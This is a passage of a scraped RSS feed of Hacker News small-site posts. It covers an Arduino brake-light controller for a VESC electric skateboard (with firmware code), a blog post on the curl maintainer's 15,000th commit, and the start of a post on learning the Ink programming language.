https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet. I used <a href="https://github.com/SolidGeek/VescUart">SolidGeek/VescUart</a> library as a reference for the code. Added some magic to be able quickly to hook callback when a specific type of commands there received.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523pragma%2520once%250A%250A%2523include%2520%253CHardwareSerial.h%253E%250A%2523include%2520%2522vesc_types.h%2522%250A%250Atypedef%2520void%2520(*vesc_command_handler_callback)(uint8_t%2520*payload%252C%2520uint16_t%2520length)%253B%250A%250Atypedef%2520struct%2520%257B%250A%2520%2520%2520%2520vesc_command_id%2520commandId%253B%250A%2520%2520%2520%2520vesc_command_handler_callback%2520callback%253B%250A%257D%2520vesc_command_handler%253B%250A%250Aclass%2520VescUart%2520%257B%250Apublic%253A%250A%2520%2520%2520%2520explicit%2520VescUart(HardwareSerial%2520*port)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520malloc(sizeof(vesc_command_handler))%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlerSize%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253Eport%2520%253D%2520port%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520void%2520addCommandHandler(vesc_command_id%2520commandId%252C%2520vesc_command_handler_callback%2520callback)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520vesc_command_handler%2520handler%2520%253D%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.commandId%2520%253D%2520commandId%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.callback%2520%253D%2520callback%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520realloc(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(this-%253EcommandHandlerSize%2520%252B%25201)%2520*%2520sizeof(vesc_command_handler)%250A%2520%2520%2520%2520%2520%2520%2520%2520)%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bthis-%253EcommandHandlerSize%252B%252B%255D%2520%253D%2520handler%253B%250A%2520%2520%2520%2520%257D%250A%250A%250A%2520%2520%2520%2520bool%2520checkVescPacket()%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520payload%255B256%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520payloadSize%2520%253D%2520receivePacket(payload)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520(payloadSize%2520%253E%25200)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520commandId%2520%253D%2520payload%255B0%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520for%2520(uint8_t%2520i%2520%253D%25200%253B%2520i%2520%253C%2520this-%253EcommandHandlerSize%253B%2520i%252B%252B)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520(this-%253EcommandHandlers%255Bi%255D.commandId%2520%253D%253D%2520commandId)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bi%255D.callback(payload%252C%2520payloadSize)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520VESC%2520Packet%253A%2520%2522)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.println(command)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520true%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520false%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%250Aprivate%253A%250A%2520%2520%2520%2520HardwareSerial%2520*port%253B%250A%2520%2520%2520%2520vesc_command_handler%2520*commandHandlers%253B%250A%2520%2520%2520%2520uint8_t%2520commandHandlerSize%253B%250A%250A%2520%2520%2520%2520static%2520bool%2520unpackPayload(uint8_t%2520*packet%252C%2520uint16_t%2520length%252C%2520uint8_t%2520*payload)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcMessage%2520%253D%25200%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcPayload%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%253D%2520packet%255Blength%2520-%25203%255D%2520%253C%253C%25208u%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%2526%253D%25200xFF00u%253B%250A%2520%2520%2520%2520%2520%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--26-.png" alt="carbon--26-"></a></p>
<!--kg-card-end: markdown--><h3 id="final-wrap">Final Wrap</h3><p>After having a way to hook into received VESC Commands, it's pretty easy to implement our simple LED dimming logic.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523include%2520%253CArduino.h%253E%250A%250A%2523define%2520DEBUG_PORT%2520Serial%250A%250A%2523include%2520%2522VescUart.h%2522%250A%250A%2523define%2520LED_DIMMER_PWM%25205%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520LED%2520DIMMER%2520PWM%2520PIN%2520(PWM%2520Compatible%2520PIN)%250A%2523define%2520LED_STATE_ON_POWER%2520HIGH%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520HIGH%252FLOW%2520when%2520power%2520is%2520applied%2520to%2520MCU%250A%2523define%2520LED_BRIGHTNESS_ON_IDLE%2520115%2520%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%2523define%2520LED_BRIGHTNESS_ON_BRAKE%2520255%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%250A%2523define%2520THROTTLE_MIDDLE%2520127%250A%250AVescUart%2520*vescUart%253B%250A%250Avoid%2520handleSetChuckDataCommand(uint8_t%2520*payload%252C%2520uint16_t%2520length)%2520%257B%250A%2520%2520%2520%2520uint8_t%2520vescThrottleValue%2520%253D%2520payload%255B2%255D%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520new%2520throttle%2520value%253A%2520%2522)%253B%250A%2520%2520%2520%2520DEBUG_PORT.println(vescThrottleValue)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(vescThrottleValue%2520%253C%2520THROTTLE_MIDDLE)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_BRAKE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520setup()%2520%257B%250A%2520%2520%2520%2520pinMode(LED_DIMMER_PWM%252C%2520OUTPUT)%253B%250A%250A%2520%2520%2520%2520Serial1.begin(115200)%253B%250A%2520%2520%2520%2520vescUart%2520%253D%2520new%2520VescUart(%2526Serial1)%253B%250A%250A%2520%2520%2520%2520vescUart-%253EaddCommandHandler(COMM_SET_CHUCK_DATA%252C%2520handleSetChuckDataCommand)%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.begin(9600)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(LED_STATE_ON_POWER%2520%253D%253D%2520HIGH)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520digitalWrite(LED_DIMMER_PWM%252C%2520LOW)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520loop()%2520%257B%250A%2520%2520%2520%2520vescUart-%253EcheckVescPacket()%253B%250A%257D%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--27-.png" alt="carbon--27-"></a></p>
<!--kg-card-end: markdown--><p>Compile and upload the code into Arduino, and it is ready to go.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-78.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-78.png 600w, https://www.techprowd.com/content/images/2020/09/image-78.png 970w" sizes="(min-width: 720px) 720px"></figure><p>You probably thinking, where is the DEMO? You wrote so much code and made a whole article, but there is no demo?</p><p>This project was basically done over the evening. Because of the timezone difference between me and Lithuania is 6 hours, I will not be able to get the demo video, but I will post it on <a href="https://twitter.com/techprowd">@techprowd</a> twitter and update the article after I receive it.</p><p>The final code archive will be uploaded on my <a href="http://patreon.com/techprowd">Patreon</a> for supporters, and I will be able to help with questions regarding how to use it there too!</p><p>I would like to include a shoutout to my father's company and an online store called <a href="https://shop.3dservisas.eu/?utm_source=techprowd">3DServisas</a>. It is primarily oriented to CNC machine custom orders, electric skateboard &amp; mountainboard parts, from gear drives to skateboard trucks.</p><p>If you are interested in building your own electric skateboard or mountainboard, go check out 3DServisas precision gear drives used by many production board makers such as <a href="https://www.bioboards.se/?utm_source=techprowd">BioBoards</a> and DIY players.</p><figure><a href="http://shop.3dservisas.eu/?utm_source=techprowd"><div><p>3DServisas Shop</p><p>CNC Machined goods</p><p><img src="http://cdn.shopify.com/s/files/1/2408/6975/files/3DServisas-logo-1_0_5x_150x150.png?v=1558443632"><span>3DServisas</span></p></div><p><img src="https://cdn.shopify.com/s/files/1/2408/6975/files/logo.png?height=628&amp;pad_color=fff&amp;v=1506788900&amp;width=1200"></p></a></figure><p>Instagram page: <a href="https://www.instagram.com/3dservisas/">https://www.instagram.com/3dservisas/</a></p><h2 id="announcement">Announcement</h2><p>I don't know if you have read my previous articles, but I have opened a Patreon account so you guys could help me by supporting my projects!</p><figure><a href="https://www.patreon.com/techprowd"><div><p>Techprowd is creating articles about software/electronics/cad and other DIY ideas | Patreon</p><p>Patreon is a membership platform that makes it easy for artists and creators to get paid. Join over 200,000 creators earning salaries from over 6 million monthly patrons.</p><p><img src="https://c5.patreon.com/external/favicon/apple-touch-icon.png?v=jw6AR4Rg74"><span>Patreon</span></p></div><p><img src="https://c10.patreonusercontent.com/3/eyJ3Ijo5NjB9/patreon-media/p/campaign/5333287/24fe815b9d214942af49618835ab1447/1.png?token-time=1601769600&amp;token-hash=d-6szlXLAeDC-Z1fx0vSdZvUw7AZpC7CEZ2uYFpFrNw%3D"></p></a></figure><p>If you are not interested in supporting, at least I suggest subscribing to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517767</guid>
            <pubDate>Fri, 18 Sep 2020 15:12:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15,000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24517595">thread link</a>) | @caution
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I‚Äôve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl‚Äôs git repository</a> ‚Äì and we don‚Äôt do merge commits so this number doesn‚Äôt include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can‚Äôt count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I‚Äôm only mentioning it here because it‚Äôs even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I‚Äôve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of ‚Äúcurl time‚Äù per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren‚Äôt included in this commit number. For example, I have done over 4,400 commits in curl‚Äôs website repository.</p>



<p>With these my first 15,000 commits I‚Äôve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to ‚Äúmodern times‚Äù, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I‚Äôve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more ‚Äúoops‚Äù commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl‚Äôs top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I‚Äôve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won‚Äôt start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I‚Äôm present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There‚Äôs a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517595</guid>
            <pubDate>Fri, 18 Sep 2020 14:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning the Ink Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517321">thread link</a>) | @healeycodes
<br/>
September 18, 2020 | https://healeycodes.com/learning-the-ink-programming-language/ | <a href="https://web.archive.org/web/*/https://healeycodes.com/learning-the-ink-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I first heard about the <a href="https://dotink.co/">Ink</a> programming language when I came across <a href="https://github.com/thesephist/polyx">Polyx</a>. Polyx is a productivity suite written in Ink that includes homegrown replacements for Dropbox and Trello as well as a personal relationship manager and a read-it-later service. <a href="https://thesephist.com/">Linus Lee</a> is the sole author of Ink and Polyx. I read through the source code of Polyx because I was interested in owning my own personal infrastructure ‚Äî and this was the start of my journey with Ink!</p>
<blockquote>
<p>A functional language that takes after modern JavaScript and Go</p>
</blockquote>
<p>Ink exists in the area between a hobby project and a fully grown programming language. It has <a href="https://dotink.co/docs/">documentation</a>, open source <a href="https://dotink.co/docs/projects/">projects</a>, and it‚Äôs actively developed with regular releases. It is easy to extend, and the source code is clear and understandable. It‚Äôs got warts, sure, but you could write an application with it that gets you a customer and earns you a dollar.</p>
<p>I sent an email to Linus to chat about the language and he pointed me to some of his newer Ink projects that contained the most idiomatic code to learn from (which were <a href="https://github.com/thesephist/september">September</a> and <a href="https://github.com/thesephist/inkfmt">inkfmt</a>). He also fast tracked a planned VS Code <a href="https://github.com/thesephist/ink-vscode">syntax highlighting extension</a> when he found out what editor I was using!</p>
<p>I spent a few weeks learning the language and created <a href="https://inkbyexample.com/">Ink by Example</a> ‚Äî a hands-on introduction to Ink using annotated example programs. Why was my first major project a learning resource? Well, writing about a topic helps me understand it but trying to teach a topic leads me to the hard questions that build mastery.</p>
<p>With technical topics, you meet the same problems that arise when trying to absorb a book. In <a href="https://andymatuschak.org/books/">Why books don‚Äôt work</a>, Andy Matuschak writes:</p>
<blockquote>
<p>Have you ever had a book like this‚Äîone you‚Äôd read‚Äîcome up in conversation, only to discover that you‚Äôd absorbed what amounts to a few sentences? I‚Äôll be honest: it happens to me regularly. Often things go well at first. I‚Äôll feel I can sketch the basic claims, paint the surface; but when someone asks a basic probing question, the edifice instantly collapses</p>
</blockquote>
<p>Until I explain a topic in a permanent medium (one that exists outside my own head) I don‚Äôt know what I don‚Äôt know. I fix this by building a structure from the basic principles all the way to the tricky nodes at the end of the graph. This can be via notes, an article, or a project.</p>
<h2 id="building-learning"><a href="#building-learning" aria-label="building learning permalink"></a>Building, Learning</h2>
<p>The best way to learn a language is to build something. Ideally, something that solves a personal problem (this motivation will drive you through the quagmires to victory). The structure of Ink by Example is <del>modelled after</del> stolen from Go by Example.</p>
<p>I enjoy language resources that zoom in on a tiny slice of the syntax and give you clean examples. Usually, this starts with printing to console.</p>
<div data-language="ink"><pre><code>std := load('../vendor/std')
log := std.log

log('hello world')</code></pre></div>
<p>If someone is fluent in another programming language they will want to know how to do <em>X</em> in <em>Y</em>. They seek to translate the building blocks that they‚Äôre familiar with; data structures, functions, and system interfaces.</p>
<p>The home page of Ink by Example presumes that you know what question you‚Äôre asking. It‚Äôs designed for an intermediate programmer.</p>
<p><span>
      <a href="https://healeycodes.com/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" title="Hello World, Values, IO, Loops, Control Flow, Lists, Maps, Functions, Files, HTTP, Random, Sorting, Execing Processes" src="https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png" srcset="https://d33wubrfki0l68.cloudfront.net/96e5028841504f3396b4175c05d816ded6f12913/f3054/static/27460cf041bae463dffa8bab25929dfd/5a46d/list.png 300w,
https://d33wubrfki0l68.cloudfront.net/05b642de4cbf965b2325222a3be889541508e308/f7a04/static/27460cf041bae463dffa8bab25929dfd/2fbbf/list.png 425w" sizes="(max-width: 425px) 100vw, 425px" loading="lazy">
  </a>
    </span></p>
<p>When building and learning at the same time I like a resource that <em>shows how something works</em>. The ‚Äòhow‚Äô ‚Äî not the ‚Äòwhy‚Äô. A section of code annotated with enough information to get you started. A section of code that you can copy, change two lines, and ship!</p>
<p><span>
      <a href="https://healeycodes.com/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" target="_blank" rel="noopener">
    <span></span>
